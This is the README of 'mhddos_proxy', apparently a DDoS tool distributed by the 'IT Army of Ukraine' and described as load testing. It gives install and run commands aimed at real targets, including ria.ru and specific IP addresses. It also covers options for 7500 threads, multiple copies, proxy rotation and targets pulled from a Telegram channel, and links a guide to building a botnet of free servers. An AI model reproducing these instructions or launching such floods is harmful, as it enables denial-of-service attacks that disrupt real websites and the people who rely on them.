## IT Army of Ukraine Official Tool

### Use flag `--lang en` to enable English translation

- Built-in proxy server database with a wide range of IPs around the world
- Possibility to set a huge number of targets with automatic load balancing
- A variety of different load-testing methods
- Effective utilization of your resources due to the asynchronous architecture

### ⏱ Recent updates

- **24.05.2022** Added auto-update option - see [Running](#2--running-different-options-for-targets-are-given)
- **21.05.2022** Added english localization - use flag `--lang EN` (more languages may be added later)
- **18.05.2022** Added `--copies` option in order to run multiple copies (recommended for use with 4+ CPUs and network > 100 Mb / s).
- **15.05.2022** Completely updated asynchronous version, which ensures maximum efficiency and minimum load on the system

### 1. 💽 Installation

#### Extended instructions (UA only so far) - [click here](/docs/installation.md)

#### Python (if it doesn't work, try `python` or `python3.10` instead of `python3`)

Requires python >= 3.8 and git

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    python3 -m pip install -r requirements.txt

#### Docker

Install and start Docker: https://docs.docker.com/desktop/#download-and-install

### 2. 🕹 Running (different options for targets are given)

#### Python with automatic updates (if it doesn't work, try `python` or `python3.10` instead of `python3`)

    ./runner.sh python3 https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

#### Python (manual updates required) (if it doesn't work, try `python` or `python3.10` instead of `python3`)

    python3 runner.py https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

#### Docker (for Linux, add sudo in front of the command)

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

### 3. 🛠 Options (check out more in the [CLI](#cli) section)

All options can be combined, you can specify them either before and after the list of targets

- To monitor information about the progress, add the `--debug` flag for the text, `--table` for the table-style display
- Consider adding your IP/VPN to the attack (especially when running on dedicated server), add flag `--vpn`
- To use targets provided by https://t.me/itarmyofukraine2022, add the `--itarmy` flag  
- Number of threads: `-t XXXX` - the default is 7500 (or 1000 if the machine has only one CPU).
- Number of copies: `--copies X` - in case you have 4+ CPU and stable network > 100 Mb/s

### 4. 📌 Help with finding new proxies for mhddos_proxy
The script itself and installation instructions are here: https://github.com/porthole-ascend-cinnamon/proxy_finder

### 5. 🐳 Community (mostly in Ukrainian)
- [Create a botnet of 30+ free and standalone Linux servers](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c)
- [Detailed analysis of mhddos_proxy and installation instructions](docs/installation.md)
- [Analysis of mhddos_proxy](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)
- [Example of running via docker on OpenWRT](https://youtu.be/MlL6fuDcWlI)
- [VPN](https://auto-ddos.notion.site/VPN-5e45e0aadccc449e83fea45d56385b54)

### 6. CLI

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-c URL]
                     [--table]
                     [--debug]
                     [--vpn]
                     [--http-methods METHOD [METHOD ...]]
                     [--itarmy]
                     [--copies COPIES]

    positional arguments:
      targets                List of targets, separated by space
    
     optional arguments:
      -h, --help             show this help message and exit
      -c, --config URL|path  URL or local path to file with targets list
      -t, --threads 7500     Number of threads (default is 7500 if CPU > 1, 1000 otherwise)
      --table / --debug      Print log as table / as text
      --vpn                  Use both my IP and proxies. Optionally, specify a percent of using my IP (default is 10%)
      --proxies URL|path     URL or local path(ex. proxies.txt) to file with proxies to use
      --http-methods GET     List of HTTP(L7) methods to use (default is GET + POST|STRESS).
      --itarmy               Attack targets from https://t.me/itarmyofukraine2022  
      --copies 1             Number of copies to run (default is 1)
      --lang {en,ua}         Select language (default is ua)

### 7. Custom proxies

#### File format (any of the following):

    IP:PORT
    IP:PORT:username:password
    username:password@IP:PORT
    protocol://IP:PORT
    protocol://IP:PORT:username:password

where `protocol` can be one of 3 options: `http`|`socks4`|`socks5`. 
If `protocol` is not specified, default value `http` is used.
For example, for a public `socks4` proxy the format will be fhe following:

    socks4://114.231.123.38:3065

and for the private `socks4` proxy format can be one of the following:

    socks4://114.231.123.38:3065:username:password
    socks4://username:password@114.231.123.38:3065

**URL of the remote file for Python and Docker**

    --proxies https://pastebin.com/raw/UkFWzLOt

where https://pastebin.com/raw/UkFWzLOt is your web page with a list of proxies (each proxy should be on a new line)  

**Path for the local file for Python**  
  
Put the file in the folder with `runner.py` and add the following option to the command (replace `proxies.txt` with the name of your file)

    --proxies proxies.txt https://ria.ru

where `proxies.txt` is your proxy list file (each proxy should be on a new line)
